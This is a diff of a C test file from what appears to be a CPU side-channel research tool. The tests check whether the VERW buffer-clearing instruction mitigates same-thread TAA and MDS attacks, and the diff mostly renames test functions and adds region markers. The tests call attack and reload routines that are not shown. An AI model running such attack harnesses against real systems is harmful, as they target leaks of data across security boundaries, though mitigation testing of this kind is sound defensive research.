-TestSuite(verw, .init = construct_app_environment, .fini = desctruct_app_environment, .disabled = false);
+TestSuite(verw, .init = construct_app_environment, .fini = desctruct_app_environment);
+
+#pragma region verw_against_same_thread_taa_nosgx_is_effective
 
 /**
- * @brief Test if verw is effective against taa_same_thread with a successful rate above 90% for all offset.
+ * @brief Test if verw is effective against same_thread_taa_nosgx with a successful rate above 90% for all offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_verw_against_taa_same_thread_is_effective()
+static int test_core_verw_against_same_thread_taa_nosgx_is_effective()
 {
     int i, offset, allowance;
 
@@ -823,7 +1586,7 @@ static int test_core_verw_against_taa_same_thread_is_effective()
     return 0;
 }
 
-Test(verw, verw_against_taa_same_thread_is_effective, .disabled = false)
+Test(verw, verw_against_same_thread_taa_nosgx_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_TAA;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
@@ -839,30 +1602,34 @@ Test(verw, verw_against_taa_same_thread_is_effective, .disabled = false)
     app_clearing_sequence = CLEARING_SEQUENCE_VERW;
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_verw_against_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_verw_against_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_verw_against_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_verw_against_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_verw_against_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_verw_against_taa_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_verw_against_same_thread_taa_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
+#pragma endregion
+
+#pragma region verw_against_same_thread_mds_nosgx_is_effective
+
 /**
- * @brief Test if verw is effective against mds_same_thread with a successful rate above 90% for all offset.
+ * @brief Test if verw is effective against same_thread_mds_nosgx with a successful rate above 90% for all offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_verw_against_mds_same_thread_is_effective()
+static int test_core_verw_against_same_thread_mds_nosgx_is_effective()
 {
     int i, offset, allowance;
 
@@ -873,7 +1640,7 @@ static int test_core_verw_against_mds_same_thread_is_effective()
         for (i = 0; i < REPETITION_TIME; i++)
         {
             flush_enclyser_buffer(&app_encoding_buffer);
-            fill_lfb(FILLING_SEQUENCE_STR_STORE, &app_filling_buffer);
+            fill_lfb(app_filling_sequence, &app_filling_buffer);
             clear_lfb(app_clearing_sequence, &app_clearing_buffer);
             attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
             reload(&app_encoding_buffer, &app_printing_buffer);
@@ -887,7 +1654,7 @@ static int test_core_verw_against_mds_same_thread_is_effective()
     return 0;
 }
 
-Test(verw, verw_against_mds_same_thread_is_effective, .disabled = false)
+Test(verw, verw_against_same_thread_mds_nosgx_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_MDS;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
@@ -905,22 +1672,24 @@ Test(verw, verw_against_mds_same_thread_is_effective, .disabled = false)
     app_clearing_sequence = CLEARING_SEQUENCE_VERW;
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_verw_against_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_verw_against_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_verw_against_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_verw_against_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_verw_against_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_verw_against_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_verw_against_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
+
+#pragma endregion
 
 #pragma endregion
